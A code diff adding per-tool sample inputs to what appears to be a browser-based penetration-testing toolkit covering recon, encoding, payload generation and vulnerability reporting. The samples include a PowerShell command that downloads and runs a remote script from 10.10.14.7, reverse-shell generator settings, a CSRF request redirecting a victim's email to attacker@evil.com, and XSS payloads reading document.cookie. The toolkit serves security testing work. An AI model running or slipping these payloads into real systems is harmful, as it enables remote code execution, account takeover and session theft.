@@ -3486,6 +3486,83 @@ TOOLS['ps-encode'] = {
 // ============================================================
 // NAVIGATION
 // ============================================================
+// ============================================================
+// Per-tool EXAMPLES — feature-specific sample inputs (not generic defaults)
+// ============================================================
+const exFill = (id, val) => {
+  const el = $('#' + id);
+  if (!el) return;
+  el.value = val;
+  el.dispatchEvent(new Event('input', { bubbles: true }));
+  el.dispatchEvent(new Event('change', { bubbles: true }));
+};
+const exFillSel = (sel, val) => {
+  const el = $(sel);
+  if (!el) return;
+  el.value = val;
+  el.dispatchEvent(new Event('input', { bubbles: true }));
+  el.dispatchEvent(new Event('change', { bubbles: true }));
+};
+const exClick = (id) => { const el = $('#' + id); if (el) el.click(); };
+const exClickText = (txt) => { const b = $$('button').find(x => x.textContent.trim() === txt); if (b) b.click(); };
+const exCvss = (vector) => {
+  vector.replace(/^CVSS:[\d.]+\//, '').split('/').forEach(pair => {
+    const [k, v] = pair.split(':');
+    const btn = $(`.metric-options[data-key="${k}"] .metric-btn[data-val="${v}"]`);
+    if (btn) btn.click();
+  });
+};
+
+const EXAMPLES = {
+  // ---- Recon ----
+  'google-dork': () => { exFill('gd-domain', 'tesla.com'); exClick('gd-gen'); },
+  'shodan-dork': () => { exFill('sd-domain', 'tesla.com'); exFill('sd-org', 'Tesla Motors'); exFill('sd-ssl', 'tesla.com'); exClick('sd-gen'); },
+  'subdomain-finder': () => { exFill('sf-domain', 'tesla.com'); },
+  'dns-lookup': () => { exFill('dns-domain', 'github.com'); exFill('dns-type', 'MX'); exClick('dns-lookup'); },
+  'ip-info': () => { exFill('ipi-input', '1.1.1.1'); exClick('ipi-lookup'); },
+  'js-analyzer': () => { exFill('js-input', `const API_KEY = "AIzaSyB1a-EXAMPLE-2c3d4e5f6g7h8i9j0";\nconst base = "https://admin-internal.example.com/api/v2";\nfetch(base + "/users?token=" + localStorage.getItem("jwt"));\n// FIXME debug: aws_secret = "AKIAIOSFODNN7EXAMPLE"`); exClick('js-analyze'); },
+  'header-analyzer': () => { exFill('hdr-input', `HTTP/1.1 200 OK\nServer: Apache/2.4.41 (Ubuntu)\nContent-Type: text/html; charset=UTF-8\nSet-Cookie: SESSIONID=8f3b2a; path=/\nX-Powered-By: PHP/7.4.3`); exClick('hdr-analyze'); },
+  'url-parser': () => { exFill('up-input', 'https://user:p%40ss@admin.example.com:8443/dashboard/report?id=42&redirect=https%3A%2F%2Fevil.com%2Fsteal#settings'); exClick('up-parse'); },
+
+  // ---- Crypto / Encoding ----
+  'base64': () => { exFill('b64-input', 'admin:S3cr3tP@ss!'); exClick('b64-encode'); },
+  'url-encode': () => { exFill('urlc-input', "https://x.com/search?q=<script>alert(1)</script>&next=a b"); exClick('urlc-encode'); },
+  'html-encode': () => { exFill('htm-input', '<img src=x onerror=alert(document.cookie)>'); exClick('htm-encode'); },
+  'hex': () => { exFill('hex-input', 'PWNED'); exClick('hex-encode'); },
+  'base32': () => { exFill('b32-input', 'otpauth-secret'); exClick('b32-encode'); },
+  'base58': () => { exFill('b58-input', '1BoatSLRHtKNngkdXEeobR76b53LETtpyT'); exClick('b58-encode'); },
+  'base85': () => { exFill('b85-input', 'payload-data'); exClick('b85-encode'); },
+  'binary': () => { exFill('bin-input', 'Hi!'); exClick('bin-encode'); },
+  'morse': () => { exFill('morse-input', 'SOS HELP'); exClick('morse-encode'); },
+  'hash': () => { exFill('hash-input', 'P@ssw0rd!2024'); exClick('hash-gen'); },
+  'hash-id': () => { exFill('hid-input', '5f4dcc3b5aa765d61d8327deb882cf99'); exClick('hid-id'); },
+  'jwt': () => { exFill('jwt-input', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMzM3IiwibmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'); exClick('jwt-decode'); },
+  'cipher': () => { exFill('cip-input', 'Attack at dawn'); exFill('cip-shift', '3'); exClickText('Caesar'); },
+  'ps-encode': () => { exFill('pe-in', "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7/rev.ps1')"); },
+
+  // ---- Payloads ----
+  'csrf-poc': () => { exFill('csrf-raw', `POST /account/email HTTP/1.1\nHost: bank.example.com\nCookie: session=eyJ1c2VyIjoidmljdGltIn0\nContent-Type: application/x-www-form-urlencoded\n\nemail=attacker%40evil.com`); exFill('csrf-scheme', 'HTTPS'); exFill('csrf-submit', 'Auto-submit'); exClick('csrf-gen'); },
+  'dos-gen': () => { exFill('dos-text', 'A'); exFill('dos-count', '50000'); exClick('dos-preview'); },
+  'revshell': () => { exFill('rsg-ip', '10.10.14.7'); exFill('rsg-port', '443'); exFill('rsg-shell', 'bash'); exFill('rsg-enc', 'b64'); },
+
+  // ---- Reporting ----
+  '3.1': () => { exClick('cvss31-reset'); exCvss('CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N'); },
+  '4.0': () => { exClick('cvss40-reset'); exCvss('CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N'); },
+  'report-template': () => {
+    exFill('rt-name', 'Reflected XSS in search parameter');
+    exFill('rt-type', 'Cross-Site Scripting (Reflected)');
+    exFill('rt-cvssver', '3.1');
+    exFill('rt-vector', 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N');
+    exFillSel('.rt-url', 'https://app.example.com/search?q=test');
+    exFillSel('.rt-ref', 'https://owasp.org/www-community/attacks/xss/');
+    exFill('rt-desc', 'The `q` parameter on the search endpoint reflects user input into the HTML response without output encoding, allowing arbitrary JavaScript execution in the victim’s browser session.');
+    exFill('rt-impact', 'An attacker can steal session cookies, perform actions as the victim, and deface the page or redirect users to phishing/malware.');
+    exFill('rt-rem', 'Context-aware output encoding for all user-controlled data; deploy a strict Content-Security-Policy; validate and sanitize input server-side.');
+    exFill('rt-poc', 'GET /search?q=<script>alert(document.cookie)</script>');
+    exClick('rt-gen');
+  },
+};
+
 const loadTool = (key) => {
   const tool = TOOLS[key];
   if (!tool) return;
@@ -3493,6 +3570,12 @@ const loadTool = (key) => {
   $('#currentToolDesc').textContent = tool.desc;
   $('#content').innerHTML = tool.render();
   if (tool.init) tool.init();
+  const exBtn = $('#rk-example-btn');
+  if (exBtn) {
+    const ex = EXAMPLES[key];
+    exBtn.style.display = ex ? '' : 'none';
+    exBtn.onclick = ex || null;
+  }
   $$('.nav-item').forEach(n => n.classList.toggle('active', n.dataset.tool === key));
   localStorage.setItem('lastTool', key);
 };
